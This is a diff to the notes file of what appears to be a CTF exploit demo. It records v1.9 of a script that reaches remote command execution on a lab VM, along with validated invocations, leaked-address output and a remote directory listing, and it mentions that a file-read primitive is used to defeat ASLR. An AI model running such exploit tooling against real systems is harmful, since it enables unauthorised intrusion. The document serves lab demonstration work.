@@ -306,18 +306,56 @@ run artifact: artifacts/demo_v1_8_20260515-055639.json
 
 Status: pass. Both the default query-param adapter and the template adapter were live-tested against the VM target.
 
+## v1.9 Changes
+
+`demo_ctf_exploit_v1_9.py` keeps the v1.8 behavior but changes final command-output rendering.
+
+- Removed the framed output block and per-line `|` prefixes.
+- Removed forced wrapping; the terminal handles visual wrapping, while the script only enforces max-line and max-character safety limits.
+- The command result is printed last as plain terminal text in a high-contrast color when color is enabled.
+- Confirmed `phpinfo()` is optional: with `--phpinfo-path ''`, the PHP fields report `not learned` but ASLR derivation and exploitation still use the file-read primitive and succeed.
+
+Validated command:
+
+```bash
+./demo_ctf_exploit_v1_9.py \
+  --host 192.168.1.205 --cmd 'ls -la /app/tmp' \
+  --fast --artifact-dir artifacts --phpinfo-path ''
+```
+
+Observed result:
+
+```text
+PHP version: not learned
+winning address: 0x55e4210b2127
+winning body offset: 1376
+run artifact: artifacts/demo_v1_9_20260515-060251.json
+```
+
+The final command output was plain:
+
+```text
+total 1836
+drwxr-xr-x 2 nobody nogroup    4096 May 15 04:02 .
+drwxr-xr-x 4 root   root       4096 May 14 21:58 ..
+-rw------- 1 nobody nogroup 2531328 May 15 04:02 core
+-rw-r--r-- 1 root   root          5 May 15 03:40 nginx.pid
+```
+
+Status: pass.
+
 ## Recommended Demo Command
 
 For video recording:
 
 ```bash
-./demo_ctf_exploit_v1_8.py --host 192.168.1.205 --port 19321 --cmd id --clear
+./demo_ctf_exploit_v1_9.py --host 192.168.1.205 --port 19321 --cmd id --clear
 ```
 
 For a fast validation run:
 
 ```bash
-./demo_ctf_exploit_v1_8.py --host 192.168.1.205 --port 19321 --cmd id --fast
+./demo_ctf_exploit_v1_9.py --host 192.168.1.205 --port 19321 --cmd id --fast
 ```
 
 ## Remaining Technical Limits
